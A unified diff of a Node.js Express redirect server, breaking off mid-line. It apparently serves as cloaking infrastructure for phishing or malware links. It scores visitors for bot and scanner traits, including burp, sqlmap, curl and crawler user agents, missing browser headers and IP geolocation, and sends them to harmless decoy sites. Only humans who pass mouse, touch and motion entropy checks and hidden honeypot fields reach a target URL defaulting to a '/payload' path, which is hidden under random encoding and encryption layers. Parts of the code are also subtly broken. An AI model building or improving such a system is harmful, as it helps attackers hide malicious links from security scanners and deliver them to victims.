@@ -1,14 +1,19 @@
 const express = require('express');
 const helmet = require('helmet');
-const fs = require('fs');
+const fs = require('fs').promises;
 const rateLimit = require('express-rate-limit');
 const crypto = require('crypto');
 const fetch = require('node-fetch');
 const NodeCache = require('node-cache');
 const JavaScriptObfuscator = require('javascript-obfuscator');
+const compression = require('compression');
+const morgan = require('morgan');
+const { body, validationResult } = require('express-validator');
 
 const app = express();
 app.set('trust proxy', 1);
+app.use(compression());
+app.use(morgan('combined'));
 
 // ─── Config ──────────────────────────────────────────────────────────────────
 const TARGET_URL   = process.env.TARGET_URL   || 'https://example.invalid/payload';
@@ -22,18 +27,36 @@ const BOT_URLS     = [
 
 const LOG_FILE     = 'clicks.log';
 const REQUEST_LOG_FILE = 'requests.log';
+const SUCCESS_LOG_FILE = 'success.log';
 const PORT         = process.env.PORT || 10000;
 const LINK_TTL_SEC = 1800; // 30 minutes
 const METRICS_API_KEY = process.env.METRICS_API_KEY || crypto.randomBytes(32).toString('hex');
+const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
+const NODE_ENV = process.env.NODE_ENV || 'production';
 
-const geoCache  = new NodeCache({ stdTTL: 86400 }); // 24 hours
-const linkCache = new NodeCache({ stdTTL: LINK_TTL_SEC });
-const linkRequestCache = new NodeCache({ stdTTL: 60 }); // 1 minute for rate limiting
-const failCache = new NodeCache({ stdTTL: 3600 }); // 1 hour for failed geolocation
+// Cache instances
+const geoCache  = new NodeCache({ stdTTL: 86400, checkperiod: 3600 }); // 24 hours
+const linkCache = new NodeCache({ stdTTL: LINK_TTL_SEC, checkperiod: 300 });
+const linkRequestCache = new NodeCache({ stdTTL: 60, checkperiod: 10 }); // 1 minute for rate limiting
+const failCache = new NodeCache({ stdTTL: 3600, checkperiod: 600 }); // 1 hour for failed geolocation
+const statsCache = new NodeCache({ stdTTL: 300, checkperiod: 60 }); // 5 minutes for stats
+
+// ─── Stats Tracking ──────────────────────────────────────────────────────────
+const stats = {
+  totalRequests: 0,
+  botBlocks: 0,
+  successfulRedirects: 0,
+  expiredLinks: 0,
+  generatedLinks: 0,
+  byCountry: new Map(),
+  byBotReason: new Map()
+};
 
 // ─── Middleware ──────────────────────────────────────────────────────────────
 app.use((req, res, next) => {
   res.locals.nonce = crypto.randomBytes(16).toString('hex');
+  res.locals.startTime = Date.now();
+  stats.totalRequests++;
   next();
 });
 
@@ -41,43 +64,73 @@ app.use(helmet({
   contentSecurityPolicy: {
     directives: {
       defaultSrc: ["'self'"],
-      scriptSrc:  ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
-      styleSrc:   ["'self'", "'unsafe-inline'"],
-      imgSrc:     ["'self'", 'data:'],
+      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", 'data:', 'https:'],
       connectSrc: ["'self'"],
-      frameSrc:   ["'self'"]
+      frameSrc: ["'none'"],
+      objectSrc: ["'none'"]
     }
+  },
+  hsts: {
+    maxAge: 31536000,
+    includeSubDomains: true,
+    preload: true
   }
 }));
 
-app.use(express.json({ limit: '1mb' }));
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: '100kb' }));
+app.use(express.urlencoded({ extended: true, limit: '100kb' }));
+
+// Request ID middleware
+app.use((req, res, next) => {
+  req.id = crypto.randomBytes(8).toString('hex');
+  res.setHeader('X-Request-ID', req.id);
+  next();
+});
 
 // ─── Logging Helper ─────────────────────────────────────────────────────────
-function logRequest(type, req, extra = {}) {
+async function logRequest(type, req, extra = {}) {
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
+  const duration = Date.now() - (res.locals?.startTime || Date.now());
+  
   const logEntry = {
     timestamp: new Date().toISOString(),
+    requestId: req.id,
     type,
     ip,
     method: req.method,
     path: req.path,
-    ua: (req.headers['user-agent'] || '').substring(0, 100),
+    duration,
+    ua: (req.headers['user-agent'] || '').substring(0, 200),
     ...extra
   };
   
-  fs.appendFile(REQUEST_LOG_FILE, JSON.stringify(logEntry) + '\n', () => {});
+  try {
+    await fs.appendFile(REQUEST_LOG_FILE, JSON.stringify(logEntry) + '\n');
+  } catch (err) {
+    console.error(`[LOG-ERR] Failed to write log: ${err.message}`);
+  }
+  
   console.log(`[${type}] ${ip} ${req.path} ${JSON.stringify(extra)}`);
 }
 
 // ─── Health Endpoints ───────────────────────────────────────────────────────
-app.get(['/ping','/health','/healthz','/status'], (_, res) => res.status(200).send('OK'));
+app.get(['/ping','/health','/healthz','/status'], (req, res) => {
+  res.status(200).json({
+    status: 'healthy',
+    timestamp: new Date().toISOString(),
+    uptime: process.uptime(),
+    requestId: req.id
+  });
+});
 
 // ─── Metrics Endpoint (Protected) ───────────────────────────────────────────
-app.get('/metrics', (req, res) => {
+app.get('/metrics', async (req, res) => {
   const apiKey = req.headers['x-api-key'];
   if (apiKey !== METRICS_API_KEY) {
-    return res.status(403).send('Forbidden');
+    await logRequest('METRICS_UNAUTHORIZED', req);
+    return res.status(403).json({ error: 'Forbidden' });
   }
 
   const stats = {
@@ -87,40 +140,60 @@ app.get('/metrics', (req, res) => {
     failCacheSize: failCache.keys().length,
     uptime: process.uptime(),
     memory: process.memoryUsage(),
+    cpu: process.cpuUsage(),
     timestamp: new Date().toISOString(),
     config: {
       linkTtlSec: LINK_TTL_SEC,
       botThreshold: 75,
-      mobileBotThreshold: 85
+      mobileBotThreshold: 85,
+      nodeEnv: NODE_ENV
+    },
+    totals: {
+      requests: stats.totalRequests,
+      blocks: stats.botBlocks,
+      successes: stats.successfulRedirects,
+      expired: stats.expiredLinks,
+      generated: stats.generatedLinks
     }
   };
   
+  await logRequest('METRICS', req);
   res.json(stats);
 });
 
 // ─── Expired Link Page ──────────────────────────────────────────────────────
 app.get('/expired', (req, res) => {
   const originalTarget = req.query.target || BOT_URLS[0];
+  const nonce = res.locals.nonce;
+  
   res.send(`
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="robots" content="noindex, nofollow">
   <title>Link Expired</title>
-  <style>
-    body{font-family:sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
-    .card{background:white;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;max-width:400px}
-    .btn{background:#0f0;color:#000;padding:0.75rem 1.5rem;border-radius:4px;text-decoration:none;display:inline-block;margin-top:1rem;font-weight:bold}
-    .btn:hover{background:#0c0}
+  <style nonce="${nonce}">
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
+    .card{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:2.5rem;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;max-width:480px;width:100%;animation:fadeIn 0.5s ease}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+    h1{font-size:2rem;margin-bottom:1rem;color:#333}
+    p{color:#666;line-height:1.6;margin-bottom:1.5rem}
+    .btn{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff;padding:1rem 2rem;border-radius:50px;text-decoration:none;display:inline-block;font-weight:600;transition:transform 0.2s,box-shadow 0.2s;border:none;cursor:pointer}
+    .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(102,126,234,0.4)}
+    .btn:active{transform:translateY(0)}
+    .icon{font-size:4rem;margin-bottom:1rem;display:block}
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>🔗 Link Expired</h1>
-    <p>This verification link has expired. Links are valid for ${LINK_TTL_SEC/60} minutes.</p>
-    <p>Please request a new link to continue.</p>
-    <a href="${originalTarget}" class="btn">Go to Site</a>
+    <span class="icon">🔗</span>
+    <h1>Link Expired</h1>
+    <p>This verification link expired after ${LINK_TTL_SEC/60} minutes for security reasons.</p>
+    <p>Please request a new link to continue to your destination.</p>
+    <a href="${originalTarget}" class="btn" rel="nofollow">Continue to Site</a>
   </div>
 </body>
 </html>
@@ -132,92 +205,127 @@ const isMobile = req => /Mobi|Android|iPhone|iPad|iPod/i.test(req.headers['user-
 
 const strictLimiter = rateLimit({
   windowMs: 60000,
-  max: req => isMobile(req) ? 15 : 5,
+  max: (req) => isMobile(req) ? 20 : 8,
   standardHeaders: true,
-  legacyHeaders: false
+  legacyHeaders: false,
+  skipSuccessfulRequests: true,
+  keyGenerator: (req) => {
+    return req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
+  }
 });
 
 function isLikelyBot(req) {
   const ua = (req.headers['user-agent'] || '').toLowerCase();
-  const h  = req.headers;
+  const h = req.headers;
   let score = 0;
   const reasons = [];
 
-  if (/headless|phantom|slurp|zgrab|scanner|bot|crawler|spider|burp|sqlmap/i.test(ua)) {
+  // Bot user agents
+  if (/headless|phantom|slurp|zgrab|scanner|bot|crawler|spider|burp|sqlmap|curl|wget|python|perl|ruby|go-http-client/i.test(ua)) {
     score += 50;
     reasons.push('bot_ua');
   }
-  if (!ua.includes('mozilla')) {
+  
+  // Missing browser indicators
+  if (!ua.includes('mozilla') && !ua.includes('applewebkit')) {
     score += 30;
-    reasons.push('non_mozilla');
+    reasons.push('non_browser_ua');
   }
+  
+  // Missing modern headers
   if (!h['sec-ch-ua'] || !h['sec-ch-ua-mobile'] || !h['sec-ch-ua-platform']) {
-    score += 35;
+    score += 25;
     reasons.push('missing_sec_headers');
   }
-  if (!h['accept-language'] || h['accept-language'].length < 5) {
+  
+  // Missing accept headers
+  if (!h['accept'] || !h['accept-language'] || h['accept-language'].length < 5) {
     score += 20;
-    reasons.push('missing_accept_language');
+    reasons.push('missing_accept_headers');
   }
-  if (Object.keys(h).length < 11) {
-    score += 25;
+  
+  // Too few headers
+  if (Object.keys(h).length < 15) {
+    score += 15;
     reasons.push('minimal_headers');
   }
+  
+  // Suspicious headers
+  if (h['accept'] && h['accept'].includes('application/x-sh')) {
+    score += 40;
+    reasons.push('suspicious_accept');
+  }
+  
+  // No referrer for direct access (sometimes normal, but can be suspicious)
+  if (!h['referer'] && req.path.startsWith('/v/')) {
+    score += 10;
+    reasons.push('no_referrer');
+  }
 
-  const botThreshold = isMobile(req) ? 85 : 75;
+  const botThreshold = isMobile(req) ? 80 : 70;
   const isBot = score >= botThreshold;
   
-  console.log(`[BOT-SCORE] ${score} | ${reasons.join(',') || 'clean'} | Threshold:${botThreshold} | IsBot:${isBot} | UA:${ua.substring(0,80)}... | Mobile:${isMobile(req)}`);
+  if (isBot) {
+    stats.botBlocks++;
+    reasons.forEach(r => {
+      stats.byBotReason.set(r, (stats.byBotReason.get(r) || 0) + 1);
+    });
+  }
+  
+  console.log(`[BOT-SCORE] ${score} | ${reasons.join(',') || 'clean'} | Threshold:${botThreshold} | IsBot:${isBot} | Mobile:${isMobile(req)}`);
 
   return isBot;
 }
 
 async function getCountryCode(req) {
   const ip = (req.headers['x-forwarded-for']?.split(',')[0]?.trim()) || req.ip || '??';
-  if (ip.match(/^(127\.|::1|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/)) return 'XX';
-
-  let cc = geoCache.get(ip);
-  if (cc) {
-    console.log(`[GEO-CACHE] ${ip} → ${cc}`);
-    return cc;
+  
+  // Skip private IPs
+  if (ip.match(/^(127\.|::1|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/)) {
+    return 'PRIVATE';
   }
 
-  // Track failed lookups to avoid hammering the API
+  let cc = geoCache.get(ip);
+  if (cc) return cc;
+
+  // Track failed lookups
   const failKey = `fail:${ip}`;
   if (failCache.get(failKey) >= 3) {
-    console.log(`[GEO-SKIP] ${ip} too many failures`);
     return 'XX';
   }
 
+  if (!IPINFO_TOKEN) return 'XX';
+
   try {
-    const token = process.env.IPINFO_TOKEN;
-    if (!token) return 'XX';
-
     const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 3500);
+    const timeout = setTimeout(() => controller.abort(), 2000);
 
-    const res = await fetch(`https://ipinfo.io/${ip}/json?token=${token}`, {
+    const response = await fetch(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`, {
       signal: controller.signal,
-      headers: { 'User-Agent': 'redir/1.0' }
+      headers: { 
+        'User-Agent': 'Redirector/2.0',
+        'Accept': 'application/json'
+      }
     });
 
     clearTimeout(timeout);
 
-    if (res.ok) {
-      const data = await res.json();
+    if (response.ok) {
+      const data = await response.json();
       cc = data.country?.toUpperCase();
-      if (/^[A-Z]{2}$/.test(cc)) {
+      
+      if (cc && /^[A-Z]{2}$/.test(cc)) {
         geoCache.set(ip, cc);
-        console.log(`[GEO-FETCH] ${ip} → ${cc}`);
+        
+        // Update country stats
+        stats.byCountry.set(cc, (stats.byCountry.get(cc) || 0) + 1);
+        
         return cc;
       }
     } else {
-      // Track failed status codes
       failCache.set(failKey, (failCache.get(failKey) || 0) + 1);
-      console.log(`[GEO-ERR] ${ip} → HTTP ${res.status}`);
     }
   } catch (err) {
-    console.log(`[GEO-ERR] ${ip} → ${err.message}`);
     failCache.set(failKey, (failCache.get(failKey) || 0) + 1);
   }
 
@@ -226,36 +334,60 @@ async function getCountryCode(req) {
 
 // ─── Encoders ────────────────────────────────────────────────────────────────
 const encoders = [
-  { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
-  { name: 'hex',       enc: s => Buffer.from(s).toString('hex'),       dec: s => Buffer.from(s, 'hex').toString() },
-  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26) + (c <= 'Z' ? 65 : 97))), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) - 13 + 26) % 26) + (c <= 'Z' ? 65 : 97))) },
-  { name: 'xor', needsKey: true,
-    enc: (s, key) => Buffer.from(s.split('').map((c,i) => c.charCodeAt(0) ^ Buffer.from(key, 'hex')[i % key.length])).toString('base64url'),
-    dec: (s, key) => Buffer.from(s, 'base64url').map((b,i) => String.fromCharCode(b ^ Buffer.from(key, 'hex')[i % key.length])).join('')
+  { 
+    name: 'base64url', 
+    enc: s => Buffer.from(s).toString('base64url'), 
+    dec: s => Buffer.from(s, 'base64url').toString() 
   },
-  { name: 'rc4', needsKey: true,
+  { 
+    name: 'hex',       
+    enc: s => Buffer.from(s).toString('hex'),       
+    dec: s => Buffer.from(s, 'hex').toString() 
+  },
+  { 
+    name: 'rot13', 
+    enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26) + (c <= 'Z' ? 65 : 97))), 
+    dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) - 13 + 26) % 26) + (c <= 'Z' ? 65 : 97))) 
+  },
+  { 
+    name: 'xor', 
+    needsKey: true,
     enc: (s, key) => {
-      const k = Buffer.from(key, 'hex');
-      let state = Array.from({length:256}, (_,i)=>i), j=0;
-      for (let i=0; i<256; i++) { j=(j+state[i]+k[i%k.length])%256; [state[i],state[j]]=[state[j],state[i]]; }
-      let out='', i=0; j=0;
-      for (let byte of Buffer.from(s)) {
-        i=(i+1)%256; j=(j+state[i])%256; [state[i],state[j]]=[state[j],state[i]];
-        out += String.fromCharCode(byte ^ state[(state[i]+state[j])%256]);
+      const keyBuf = Buffer.from(key, 'hex');
+      const result = Buffer.alloc(s.length);
+      for (let i = 0; i < s.length; i++) {
+        result[i] = s.charCodeAt(i) ^ keyBuf[i % keyBuf.length];
       }
-      return Buffer.from(out).toString('base64url');
+      return result.toString('base64url');
     },
-    dec: (s, key) => encoders.find(e=>e.name==='rc4').enc(Buffer.from(s,'base64url').toString(), key)
-  },
-  { name: 'unicode-stego',
-    enc: s => Buffer.from(s).reduce((out,byte) => out + String.fromCodePoint(0xFE00+(byte>>4)) + String.fromCodePoint(0xE000+(byte&0xF)), ''),
-    dec: s => {
-      let bytes = [];
-      for (let i=0; i<s.length-1; i+=2) {
-        const hi = s.codePointAt(i)-0xFE00, lo = s.codePointAt(i+1)-0xE000;
-        if (hi>=0&&hi<=15 && lo>=0&&lo<=15) bytes.push((hi<<4)|lo);
+    dec: (s, key) => {
+      const keyBuf = Buffer.from(key, 'hex');
+      const buf = Buffer.from(s, 'base64url');
+      let result = '';
+      for (let i = 0; i < buf.length; i++) {
+        result += String.fromCharCode(buf[i] ^ keyBuf[i % keyBuf.length]);
       }
-      return Buffer.from(bytes).toString('utf8');
+      return result;
+    }
+  },
+  { 
+    name: 'aes-256-gcm',
+    needsKey: true,
+    enc: (s, key) => {
+      const iv = crypto.randomBytes(12);
+      const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex').slice(0, 32), iv);
+      const encrypted = Buffer.concat([cipher.update(s, 'utf8'), cipher.final()]);
+      const authTag = cipher.getAuthTag();
+      return Buffer.concat([iv, authTag, encrypted]).toString('base64url');
+    },
+    dec: (s, key) => {
+      const buf = Buffer.from(s, 'base64url');
+      const iv = buf.slice(0, 12);
+      const authTag = buf.slice(12, 28);
+      const encrypted = buf.slice(28);
+      const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(key, 'hex').slice(0, 32), iv);
+      decipher.setAuthTag(authTag);
+      return decipher.update(encrypted) + decipher.final('utf8');
     }
   }
 ];
@@ -263,72 +395,99 @@ const encoders = [
 // ─── Encode / Decode ─────────────────────────────────────────────────────────
 function multiLayerEncode(str) {
   let result = str;
-  const noiseLen = 5 + Math.floor(Math.random()*11);
-  const noise = crypto.randomBytes(noiseLen).toString('hex');
+  
+  // Add random noise
+  const noiseLen = 8 + Math.floor(Math.random() * 16);
+  const noise = crypto.randomBytes(noiseLen).toString('base64url');
   result = noise + result + noise;
 
-  const integrityKey = crypto.randomBytes(8).toString('hex');
+  // Add HMAC integrity
+  const integrityKey = crypto.randomBytes(16).toString('hex');
   const hmac = crypto.createHmac('sha256', integrityKey).update(result).digest('base64url');
-  result += `|${hmac}|${integrityKey}`;
+  result = `${result}|${hmac}|${integrityKey}`;
 
-  const shuffled = [...encoders].sort(() => Math.random()-0.5);
-  const selected = shuffled.slice(0, 5 + Math.floor(Math.random()*4));
+  // Select random layers
+  const shuffled = [...encoders].sort(() => Math.random() - 0.5);
+  const numLayers = 3 + Math.floor(Math.random() * 4); // 3-6 layers
+  const selected = shuffled.slice(0, numLayers);
 
   const layerHistory = [];
   for (const layer of selected) {
-    let key = layer.needsKey ? crypto.randomBytes(8 + Math.floor(Math.random()*9)).toString('hex') : null;
+    let key = layer.needsKey ? crypto.randomBytes(24).toString('hex') : null;
     result = key ? layer.enc(result, key) : layer.enc(result);
     layerHistory.push({ name: layer.name, key });
   }
 
+  // Final base64 encoding
   result = Buffer.from(result).toString('base64url');
-  console.log(`[ENCODE] len:${result.length} layers:${layerHistory.map(l=>l.name).join(',')}`);
+  
+  console.log(`[ENCODE] len:${result.length} layers:${layerHistory.map(l => l.name).join(',')}`);
 
   return { encoded: result, layers: layerHistory.reverse() };
 }
 
-function multiLayerDecode(encoded, layers) {
-  let result;
-  try { result = Buffer.from(encoded, 'base64url').toString('utf8'); } catch { console.log('[DECODE-ERR] base64url failed'); return null; }
-
-  const parts = result.split('|');
-  if (parts.length >= 3) {
-    const payload = parts[0], received = parts[1], key = parts[2];
-    if (crypto.createHmac('sha256', key).update(payload).digest('base64url') !== received) {
-      console.log('[DECODE-ERR] HMAC failed');
-      return null;
-    }
-    result = payload;
-  }
-
-  for (const { name, key } of layers) {
-    const layer = encoders.find(e => e.name === name);
-    if (!layer) continue;
-    try { result = key ? layer.dec(result, key) : layer.dec(result); } catch { console.log(`[DECODE-ERR] layer ${name} failed`); return null; }
-  }
-
-  const noiseGuess = Math.floor(result.length * 0.07);
-  if (result.length > noiseGuess * 2 + 20) result = result.slice(noiseGuess, -noiseGuess);
-
-  return result;
-}
-
 // ─── Generate ────────────────────────────────────────────────────────────────
-app.get('/g', (req, res) => {
+app.get('/g', [
+  body('t').optional().isURL().withMessage('Invalid target URL')
+], (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({ success: false, errors: errors.array() });
+  }
+
   const target = req.query.t || TARGET_URL;
-  const payload = target + '#' + crypto.randomBytes(6).toString('hex') + '-' + Date.now();
+  const timestamp = Date.now();
+  const randomId = crypto.randomBytes(6).toString('hex');
+  const payload = `${target}#${randomId}-${timestamp}`;
 
   const { encoded, layers } = multiLayerEncode(payload);
   const layersB64 = Buffer.from(JSON.stringify(layers)).toString('base64url');
 
-  const id = crypto.randomBytes(10).toString('hex');
-  linkCache.set(id, { e: encoded, l: layersB64, target });
+  const id = crypto.randomBytes(12).toString('hex');
+  linkCache.set(id, { 
+    e: encoded, 
+    l: layersB64, 
+    target,
+    created: timestamp,
+    expires: timestamp + (LINK_TTL_SEC * 1000)
+  });
 
-  const url = `https://${req.hostname}/v/${id}`;
-  console.log(`[GENERATED] ${url} → ${target.substring(0,60)}...`);
+  stats.generatedLinks++;
 
+  const url = `${req.protocol}://${req.get('host')}/v/${id}`;
+  
   logRequest('GENERATE', req, { linkId: id, target: target.substring(0, 60) });
-  res.json({ success: true, url });
+  
+  res.json({ 
+    success: true, 
+    url,
+    expiresIn: LINK_TTL_SEC,
+    linkId: id
+  });
+});
+
+// ─── Success Tracking ────────────────────────────────────────────────────────
+app.post('/track/success', express.json({ limit: '1kb' }), async (req, res) => {
+  const { linkId, metrics } = req.body;
+  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
+  
+  stats.successfulRedirects++;
+  
+  const logEntry = {
+    timestamp: new Date().toISOString(),
+    linkId,
+    ip,
+    metrics,
+    ua: req.headers['user-agent']
+  };
+  
+  try {
+    await fs.appendFile(SUCCESS_LOG_FILE, JSON.stringify(logEntry) + '\n');
+  } catch (err) {
+    console.error(`[SUCCESS-LOG-ERR] ${err.message}`);
+  }
+  
+  res.status(200).json({ success: true });
 });
 
 // ─── Verification gate ───────────────────────────────────────────────────────
@@ -336,147 +495,249 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
   const linkId = req.params.id;
   
-  // Check for excessive requests to the same link
+  // Rate limiting per link
   const linkKey = `${linkId}:${ip}`;
   const requestCount = linkRequestCache.get(linkKey) || 0;
   
-  if (requestCount >= 3) { // Max 3 requests per minute per IP per link
-    console.log(`[RATE-LIMIT] ${ip} attempted ${linkId} ${requestCount+1} times`);
-    logRequest('RATE_LIMIT', req, { linkId, count: requestCount + 1 });
-    const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
-    return res.redirect(safe);
+  if (requestCount >= 5) {
+    await logRequest('RATE_LIMIT', req, { linkId, count: requestCount + 1 });
+    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
   }
   
   linkRequestCache.set(linkKey, requestCount + 1);
 
   const country = await getCountryCode(req);
-  const ua = req.headers['user-agent'] || '';
+  
+  await logRequest('ACCESS', req, { linkId, country, requestCount: requestCount + 1 });
 
-  logRequest('ACCESS', req, { linkId, country, requestCount: requestCount + 1 });
-
+  // Bot check
   if (isLikelyBot(req)) {
-    fs.appendFile(LOG_FILE, `${new Date().toISOString()} BOT ${ip} ${country}\n`, ()=>{});
+    await fs.appendFile(LOG_FILE, `${new Date().toISOString()} BOT ${ip} ${country}\n`);
     const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
-    console.log(`[BLOCK] Bot → ${safe}`);
-    logRequest('BLOCK', req, { linkId, country, reason: 'bot_detected', redirectTo: safe });
+    await logRequest('BLOCK', req, { linkId, country, reason: 'bot_detected' });
     return res.redirect(safe);
   }
 
-  fs.appendFile(LOG_FILE, `${new Date().toISOString()} VIEW ${ip} ${country}\n`, ()=>{});
+  await fs.appendFile(LOG_FILE, `${new Date().toISOString()} VIEW ${ip} ${country}\n`);
 
-  const data = linkCache.get(req.params.id);
+  // Check link existence
+  const data = linkCache.get(linkId);
   if (!data) {
-    console.log(`[EXPIRED] ${req.params.id}`);
-    logRequest('EXPIRED', req, { linkId, country });
+    stats.expiredLinks++;
+    await logRequest('EXPIRED', req, { linkId, country });
     return res.redirect(`/expired?target=${encodeURIComponent(BOT_URLS[0])}`);
   }
 
-  const hpSuffix = crypto.randomBytes(5).toString('hex');
+  const hpSuffix = crypto.randomBytes(4).toString('hex');
+  const nonce = res.locals.nonce;
 
+  // Generate challenge with success tracking
   const rawChallenge = `(function(){
-    const T = '${data.target.replace(/'/g,"\\'")}';
-    const B = '${BOT_URLS[0]}';
+    const TARGET = '${data.target.replace(/'/g, "\\'")}';
+    const FALLBACK = '${BOT_URLS[0]}';
+    const LINK_ID = '${linkId}';
+    
+    let metrics = {
+      moves: 0,
+      entropy: 0,
+      touches: 0,
+      orientation: false,
+      motion: false,
+      startTime: Date.now()
+    };
 
-    let moves=0, ent=0, lx=0, ly=0, lt=Date.now();
-    let mot=0, tiltE=0, lb=null, lg=null;
-    let comp=0, compE=0, la=null;
-    let hasM=false, hasO=false, hasCV=false;
-    let touch=false;
-
-    function ue(dx,dy){const dt=(Date.now()-lt)/1e3||1;ent+=Math.log2(1+Math.hypot(dx,dy))/dt*1.35;lt=Date.now();moves++}
-
-    addEventListener('mousemove',e=>{if(lx&&ly)ue(Math.abs(e.clientX-lx),Math.abs(e.clientY-ly));lx=e.clientX;ly=e.clientY},{passive:true});
-    addEventListener('touchmove',e=>{if(e.touches?.length){const t=e.touches[0];if(lx&&ly)ue(Math.abs(t.clientX-lx),Math.abs(t.clientY-ly));lx=t.clientX;ly=t.clientY}},{passive:true});
-    addEventListener('touchstart',()=>{touch=true},{once:true,passive:true});
-
-    addEventListener('devicemotion',e=>{hasM=true;mot++;if(e.accelerationIncludingGravity){const a=e.accelerationIncludingGravity;tiltE+=Math.abs(a.x||0)+Math.abs(a.y||0)+Math.abs(a.z||0)*0.6}if(e.rotationRate)tiltE+=(Math.abs(e.rotationRate.alpha||0)+Math.abs(e.rotationRate.beta||0)+Math.abs(e.rotationRate.gamma||0))*0.4},{passive:true});
-
-    addEventListener('deviceorientation',e=>{hasO=true;mot++;if(typeof e.alpha==='number'&&!isNaN(e.alpha)){comp++;if(la!==null){const d=Math.min(Math.abs(e.alpha-la),360-Math.abs(e.alpha-la));compE+=d*0.38;if(d>1.8)hasCV=true}la=e.alpha}if(typeof e.beta==='number'&&typeof e.gamma==='number'){if(lb!==null&&lg!==null)tiltE+=(Math.abs(e.beta-lb)+Math.abs(e.gamma-lg))*0.35;lb=e.beta;lg=e.gamma}},{passive:true});
-
-    function hpFilled(){
-      return document.getElementById('hp_n_${hpSuffix}')?.value.trim() ||
-             document.getElementById('hp_e_${hpSuffix}')?.value.trim() ||
-             document.getElementById('hp_w_${hpSuffix}')?.value.trim() ||
-             document.getElementById('hp_c_${hpSuffix}')?.checked;
+    function trackSuccess() {
+      fetch('/track/success', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ linkId: LINK_ID, metrics }),
+        keepalive: true
+      }).catch(() => {});
     }
 
-    setTimeout(()=>{
-      const mob=/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-      const minEnt=mob?0.75:5.2, minMov=mob?0:2, minTilt=mob?0.55:2.8, minComp=mob?2.0:0, minMot=mob?2:0;
+    // Mouse/Touch tracking
+    let lastX = 0, lastY = 0, lastTime = Date.now();
+    
+    function updateMovement(x, y) {
+      if (lastX && lastY) {
+        const dx = Math.abs(x - lastX);
+        const dy = Math.abs(y - lastY);
+        const dt = (Date.now() - lastTime) / 1000 || 1;
+        metrics.entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt;
+        metrics.moves++;
+      }
+      lastX = x;
+      lastY = y;
+      lastTime = Date.now();
+    }
 
-      const sus = 
-        hpFilled() ||
-        ent < minEnt || moves < minMov ||
+    // Event listeners
+    document.addEventListener('mousemove', e => {
+      updateMovement(e.clientX, e.clientY);
+    }, { passive: true });
+
+    document.addEventListener('touchmove', e => {
+      if (e.touches.length) {
+        const touch = e.touches[0];
+        updateMovement(touch.clientX, touch.clientY);
+        metrics.touches++;
+      }
+    }, { passive: true });
+
+    document.addEventListener('touchstart', () => {
+      metrics.touches++;
+    }, { passive: true });
+
+    // Device orientation
+    if (window.DeviceOrientationEvent) {
+      window.addEventListener('deviceorientation', e => {
+        metrics.orientation = true;
+      }, { passive: true });
+    }
+
+    // Device motion
+    if (window.DeviceMotionEvent) {
+      window.addEventListener('devicemotion', e => {
+        metrics.motion = true;
+      }, { passive: true });
+    }
+
+    // Honeypot check
+    function honeypotFilled() {
+      return document.getElementById('hp_name_${hpSuffix}')?.value ||
+             document.getElementById('hp_email_${hpSuffix}')?.value ||
+             document.getElementById('hp_phone_${hpSuffix}')?.value;
+    }
+
+    // Decision timeout
+    setTimeout(() => {
+      const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      
+      // Adjust thresholds based on device
+      const minEntropy = isMobile ? 0.5 : 3.0;
+      const minMoves = isMobile ? 0 : 2;
+      
+      const suspicious = 
+        honeypotFilled() ||
+        metrics.entropy < minEntropy ||
+        (isMobile && metrics.touches === 0 && metrics.moves > 0) ||
